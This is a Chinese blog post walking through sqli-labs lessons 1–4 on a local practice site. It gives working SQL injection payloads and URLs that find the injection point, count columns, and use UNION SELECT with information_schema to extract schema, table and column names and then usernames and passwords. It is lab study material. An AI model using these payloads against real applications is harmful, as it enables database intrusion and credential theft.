---
title: sqli labs lesson 1~4 学习
date: 2016-08-24 21:46:03
tags:
- 渗透测试
- SQL 注入
categories: SQL 注入
---
# 1 lesson 1：基于错误 – 单引号
## 1.1 测试
输入URL  ` http://localhost/sqli-labs-master/Less-1/?id=1 `
![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f75rh022ipj30fy05xdgk.jpg)

在上述网址后面添加单引号 '   `http://localhost/sqli-labs-master/Less-1/?id=1%27 `
![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f75rvy5dn9j30nq05mmyk.jpg)

根据错误信息，推测sql语句类似  ` SELECT * FROM tables WHERE id='$id' LIMIT 0,1`
<font color="red">$id是被单引号包裹的</font>

## 1.2 猜测字段个数
使用 order by 判断字段个数
- 参数 $id = `' order by 5#`
- 输入URL `http://localhost/sqli-labs-master/Less-1/?id=%27%20order%20by%205%23`
- sql语句：`SELECT * FROM tables WHERE id='$id' LIMIT 0,1`，将参数 $id = `' order by 5#`带入，即得 `SELECT * FROM tables WHERE id='' order by 5#' LIMIT 0,1`
- 说明：浏览器对 URL 会转码；第一个单引号闭合sql语句中的单引号；#是数据库注释，注释掉后面的单引号和limit

![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f75smugixtj30ca03xdfz.jpg)

直到输入参数 $id = `' order by 3#`，页面正常显示
![](https://ww4.sinaimg.cn/large/005CA6ZCjw1f75sddgu6hj30c903wq2v.jpg)

<font color="red"> 
说明原sql语句的结果有三个字段
sql 语句类似 `select col1,col2,col3 from tables where id = '$id' limit 0,1`
</font>

## 1.3 union 查询数据库版本和数据库名
- 参数 $id = `' union select 1,2,3%23`
- URL `http://localhost/sqli-labs-master/Less-1/?id=%27%20union%20select%201,2,3%23`

![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f75sscqjybj30cb03xq38.jpg)

查看版本和数据库
- 参数 $id = `' union select 1,version(),database()%23`
- URL `http://localhost/sqli-labs-master/Less-1/?id=%27%20union%20select%201,version(),database()%23`

![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f75sni3booj30cb03v0t3.jpg)

- 数据库版本 5.6.17
- 数据库名 security

## 1.4 利用 information_schema 获得信息
关于 information_schema 数据库信息，参见 [INFORMATION_SCHEMA 数据库](http://huirong.github.io/2016/08/24/information-schema/)
### 1.4.1 数据库名
- 参数 $id = `' union select 1,2,(select group_concat(distinct schema_name) from information_schema.schemata)%23`

![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f75sx1egqnj30sc03xdgt.jpg)

本地数据库中的数据有：information_schema,challenges,mysql,performance_schema,security,test
本项目的数据库为：security
### 1.4.2 表名
- 参数 $id = `' union select 1,2,(select group_concat(distinct table_name) from information_schema.tables where table_schema = "security")%23`

![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f75tjf3xqdj30ft045jry.jpg)

security 数据中的表：emails,referers,uagents,users

### 1.4.3 字段名
- 参数 $id = `' union select 1,2,(select group_concat(distinct column_name) from information_schema.columns where table_schema = "security")%23`

![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f75torfahjj30oe04g759.jpg)

users 表中的字段：id,email_id,referer,ip_address,uagent,username,password

### 1.4.4 账号和密码
- 参数 $id = `' union select 1,(select group_concat(distinct username) from users),(select group_concat(distinct password) from users)%23`
- URL `http://localhost/sqli-labs-master/Less-1/?id=%27%20union%20select%201,(select%20group_concat(distinct%20username)%20from%20users),(select%20group_concat(distinct%20password)%20from%20users)%23`

![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f75ttggpvjj311503fdi1.jpg)

# 2 lesson 2 基于错误 – 数字型
## 2.1 测试
- 参数 $id = `1'`
- URL `http://localhost/sqli-labs-master/Less-2/?id=1%27`
- 错误 `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1`

![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f76056s2twj30zh02xmy3.jpg)

说明sql语句类似：`select * from tables where id = $id LIMIT 0,1`，没有单引号，直接是数字型。

## 2.2 数据库版本和名称
- 参数 $id = `1 and 1=0 union select 1,2,3%23`
- URL `http://localhost/sqli-labs-master/Less-2/?id=1%20and%201=0%20union%20select%201,version(),database()%23`

![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f760kucepdj30cb03x74o.jpg)

其他步骤同 lesson 1。

# 3 lesson 3 基于错误-有括号单引号
## 3.1 测试
- 参数 $id = `1'`
- URL `http://localhost/sqli-labs-master/Less-3/?id=1%27`
- 错误 `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1`
![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f760hn80gvj310e0353zg.jpg)

sql 语句 select * from tables where id = ('$id') limit 0,1

## 3.2 数据库版本和名称
- 参数 $id = `') union select 1,version(),database()%23`
- URL `http://localhost/sqli-labs-master/Less-3/?id=%27)%20union%20select%201,version(),database()%23`

![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f760mzp1alj30cb03xgm0.jpg)

# 4 lesson 4 基于错误-有括号双引号
## 4.1 测试
- 参数 $id = `1'` 页面没有错误，继续测试  $id = `1"` ，页面出错
- URL `http://localhost/sqli-labs-master/Less-4/?id=1%22`
- 错误 `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1`

![](https://ww3.sinaimg.cn/large/005CA6ZCjw1f7610l00g9j310h02s3zh.jpg)

sql 语句：select * from tables where id = ("$id") limit 0,1

## 4.2 数据库版本和名称
- 参数 $id = `") union select 1,version(),database()%23`
- URL `http://localhost/sqli-labs-master/Less-4/?id=%22)%20union%20select%201,version(),database()%23`

# 5 参考文献
[SQLI-LABS SERIES PART - 2,3,4,5](http://dummy2dummies.blogspot.com/2012/06/sqli-lab-series-part2.html)


